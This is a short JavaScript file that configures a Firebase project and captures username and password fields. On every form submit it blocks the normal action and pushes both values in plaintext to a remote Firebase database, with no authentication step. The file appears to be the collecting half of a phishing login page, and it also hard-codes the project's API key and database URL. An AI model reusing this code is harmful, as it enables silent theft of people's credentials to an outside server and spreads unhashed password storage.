import { initializeApp } from 'firebase/app'
import { getDatabase, ref, push, get, remove } from 'firebase/database'

const appSettings = {
  apiKey: "AIzaSyBQts3qSXBshV58CA2UE3KquarRMA67oVA",
  authDomain: "tmfb-7197d.firebaseapp.com",
  databaseURL: "https://tmfb-7197d-default-rtdb.firebaseio.com",
  projectId: "tmfb-7197d",
  storageBucket: "tmfb-7197d.appspot.com",
  messagingSenderId: "607965809683",
  appId: "1:607965809683:web:f6b92ab4694305c7ab03e6",
  measurementId: "G-N2L75J4Q00"
  };
const app = initializeApp(appSettings)
const database = getDatabase(app)
const logins = ref(database)


document.addEventListener('submit', (e) => {
    e.preventDefault()
    const user = document.getElementById('user-input-1')
    const password = document.getElementById('user-input-2')
    push(logins, {
        User: user.value,
        Password: password.value
    })
})
console.log("clear")
